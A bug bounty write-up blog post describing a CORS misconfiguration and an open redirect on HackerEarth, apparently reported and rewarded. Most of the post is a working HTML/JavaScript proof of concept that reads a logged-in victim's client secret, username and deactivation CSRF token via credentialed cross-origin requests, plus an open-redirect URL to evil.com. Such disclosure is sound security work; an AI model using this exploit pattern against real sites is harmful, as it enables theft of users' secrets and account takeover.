---
title:      Stealing secrets tokens and all private info of hackerearth users  
date:       2020-08-30 11:31:19
author:     dr3dd
summary:    Stealing secrets tokens of hackerearth users account 
categories: Bug-Bounty
thumbnail:  book
tags:
 - Bug-Bounty
---

Hi all,

I found two bugs in hackerearth. Got T-shirt as swag.

### 1. cores misconfiguration

When i change the origin header in request to `https://www.hackerearth.com.evil.com` the responce i got was:

```python
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://www.hackerearth.com.evil.com
```

The backend regex only checks for `www.hackerearth.com` after `https://`. So i made a subdomain of `www.hackerearth.com.dr3dd.live`. After sending this subdomain in request as origin header i got below response: 

```python
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://www.hackerearth.com.dr3dd.live
```

As we can see `Access-Control-Allow-Credentials: true` for `www.hackerearth.com.dr3dd.live`. Yesss!! 
So i wrote a small js script to steal secrets tokens of victim account.

```html
<!DOCTYPE html>
<html>
<body>

<div>
<h1>Getting hackerearth Client secrets for victim!!!</h1>
<button type="button" onclick="loadDoc()">Get secrets!!!</button>
  <div id="demo1"></div>
  <div id="demo2"></div>
  <div id="demo3"></div>
<button type="button" onclick="get_csrf_token()">You can get any csrf token and make changes in victim account like this is account deactivate csrf token!!!</button>
  <div id="demo4"></div>
</div>

<script>
function loadDoc() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        var parser=new DOMParser();
        var xmlDoc=parser.parseFromString(this.responseText, "text/html").documentElement;
        var clientId = xmlDoc.querySelector('#client-id');
        var clientSecret = xmlDoc.querySelector('#client-secret');
        var username = xmlDoc.querySelector('#change-username');
        document.getElementById("demo1").innerHTML = clientId.innerText;
        document.getElementById("demo2").innerHTML = clientSecret.innerText;
        document.getElementById("demo3").innerHTML = username.innerText.replace('Edit','');;
        
    }
  };
  xhttp.open("GET", "https://www.hackerearth.com/users/profile-settings/", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
function get_csrf_token(){
  var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        var parser=new DOMParser();
        var xmlDoc= parser.parseFromString(this.responseText, "text/html").documentElement;
        var csrf = xmlDoc.querySelector('#deactivate-form')[0].value;
      document.getElementById("demo4").innerHTML = "csrf for deactivate account : " + csrf;
    }
  };
  var username = document.getElementById("demo3").innerText;
  var url = "https://www.hackerearth.com/deactivate/" + username.replace("Username: ","");;
  xhttp.open("GET", url, true);
  xhttp.withCredentials = true;
  xhttp.send();
}
  
  
</script>

</body>
</html>
```

I have hosted it on `http://www.hackerearth.com.dr3dd.live/cores.html` first button steal secrets token and second one steal csrf tokens of victim.


### 2. Open Redirect 

This one is pretty simple bug.

`https://www.hackerearth.com/social-login-complete-page/?redirect=https://evil.com`
